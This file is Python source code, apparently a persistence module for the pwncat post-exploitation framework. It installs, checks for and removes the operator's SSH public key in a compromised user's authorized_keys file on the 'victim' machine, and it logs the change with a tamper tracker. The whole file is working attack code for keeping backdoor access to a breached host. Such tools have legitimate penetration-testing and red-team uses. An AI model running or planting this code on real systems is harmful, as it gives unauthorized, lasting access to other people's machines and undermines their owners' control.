import os
from typing import Optional

import pwncat
import pwncat.tamper
from pwncat.persist import PersistenceMethod, PersistenceError
from pwncat.util import Access


class Method(PersistenceMethod):
    """ Add SSH public-key persistenc to the current user """

    # This is a user-based persistence module, not a system-wide persistence
    # module.
    system = False
    name = "authorized_keys"
    local = False

    def installed(self, user: Optional[str] = None) -> bool:

        homedir = pwncat.victim.users[user]["home"]
        if not homedir or homedir == "":
            return False

        # Create .ssh directory if it doesn't exist
        access = pwncat.victim.access(os.path.join(homedir, ".ssh"))
        if Access.DIRECTORY not in access or Access.EXISTS not in access:
            return False

        # Create the authorized_keys file if it doesn't exist
        access = pwncat.victim.access(os.path.join(homedir, ".ssh", "authorized_keys"))
        if Access.EXISTS not in access:
            return False
        else:
            try:
                # Read in the current authorized keys if it exists
                with pwncat.victim.open(
                    os.path.join(homedir, ".ssh", "authorized_keys"), "r"
                ) as filp:
                    authkeys = filp.readlines()
            except (FileNotFoundError, PermissionError) as exc:
                return False
        try:
            # Read our public key
            with open(pwncat.victim.config["privkey"] + ".pub", "r") as filp:
                pubkey = filp.readlines()
        except (FileNotFoundError, PermissionError) as exc:
            return False

        # Ensure we read a public key
        if not pubkey:
            return False

        return pubkey[0] in authkeys

    def install(self, user: Optional[str] = None):

        homedir = pwncat.victim.users[user]["home"]
        if not homedir or homedir == "":
            raise PersistenceError("no home directory")

        # Create .ssh directory if it doesn't exist
        access = pwncat.victim.access(os.path.join(homedir, ".ssh"))
        if Access.DIRECTORY not in access or Access.EXISTS not in access:
            pwncat.victim.run(["mkdir", "-p", os.path.join(homedir, ".ssh")])

        # Create the authorized_keys file if it doesn't exist
        access = pwncat.victim.access(os.path.join(homedir, ".ssh", "authorized_keys"))
        if Access.EXISTS not in access:
            pwncat.victim.run(
                ["touch", os.path.join(homedir, ".ssh", "authorized_keys")]
            )
            pwncat.victim.run(
                ["chmod", "600", os.path.join(homedir, ".ssh", "authorized_keys")]
            )
            authkeys = []
        else:
            try:
                # Read in the current authorized keys if it exists
                with pwncat.victim.open(
                    os.path.join(homedir, ".ssh", "authorized_keys"), "r"
                ) as filp:
                    authkeys = filp.readlines()
            except (FileNotFoundError, PermissionError) as exc:
                raise PersistenceError(str(exc))

        try:
            # Read our public key
            with open(pwncat.victim.config["privkey"] + ".pub", "r") as filp:
                pubkey = filp.readlines()
        except (FileNotFoundError, PermissionError) as exc:
            raise PersistenceError(str(exc))

        # Ensure we read a public key
        if not pubkey:
            raise PersistenceError(
                f"{pwncat.victim.config['privkey']+'.pub'}: empty public key"
            )

        # Add our public key
        authkeys.extend(pubkey)
        authkey_data = "".join(authkeys)

        # Write the authorized keys back to the authorized keys
        try:
            with pwncat.victim.open(
                os.path.join(homedir, ".ssh", "authorized_keys"),
                "w",
                length=len(authkey_data),
            ) as filp:
                filp.write(authkey_data)
        except (FileNotFoundError, PermissionError) as exc:
            raise PersistenceError(str(exc))

        # Register the modifications with the tamper module
        pwncat.victim.tamper.modified_file(
            os.path.join(homedir, ".ssh", "authorized_keys"), added_lines=pubkey[0]
        )

    def remove(self, user: Optional[str] = None):

        homedir = pwncat.victim.users[user]["home"]
        if not homedir or homedir == "":
            raise PersistenceError("no home directory")

        try:
            # Read in the current authorized keys if it exists
            with pwncat.victim.open(
                os.path.join(homedir, ".ssh", "authorized_keys"), "r"
            ) as filp:
                authkeys = filp.readlines()
        except (FileNotFoundError, PermissionError) as exc:
            raise PersistenceError(str(exc))

        try:
            # Read our public key
            with open(pwncat.victim.config["privkey"] + ".pub", "r") as filp:
                pubkey = filp.readlines()
        except (FileNotFoundError, PermissionError) as exc:
            raise PersistenceError(str(exc))

        # Ensure we read a public key
        if not pubkey:
            raise PersistenceError(
                f"{pwncat.victim.config['privkey']+'.pub'}: empty public key"
            )

        # Build a new authkeys without our public key
        new_authkeys = []
        for key in authkeys:
            if key not in pubkey:
                new_authkeys.append(key)

        authkey_data = "".join(new_authkeys)

        # Write the authorized keys back to the authorized keys
        try:
            with pwncat.victim.open(
                os.path.join(homedir, ".ssh", "authorized_keys"),
                "w",
                length=len(authkey_data),
            ) as filp:
                filp.write(authkey_data)
        except (FileNotFoundError, PermissionError) as exc:
            raise PersistenceError(str(exc))

        # Remove the tamper tracking
        for tamper in pwncat.victim.tamper:
            if isinstance(tamper, pwncat.tamper.ModifiedFile) and tamper.added_lines:
                if pubkey[0] in tamper.added_lines:
                    pwncat.victim.tamper.remove(tamper)
                    break
